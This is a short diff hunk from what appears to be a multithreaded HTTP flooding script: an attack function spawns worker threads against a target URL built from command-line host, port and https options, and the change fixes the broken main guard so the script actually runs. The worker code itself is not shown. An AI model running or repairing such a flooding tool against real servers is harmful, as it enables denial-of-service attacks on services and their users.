@@ -97,6 +97,7 @@ def attack(target, threads):
     for _ in range(threads):
         threading.Thread(target=worker, args=(target, headers)).start()
 
-if name == "main":
+if __name__ == "__main__":
     target = f"http{'s' if args.https else ''}://{args.target}:{args.port}"
     attack(target, args.threads)
+
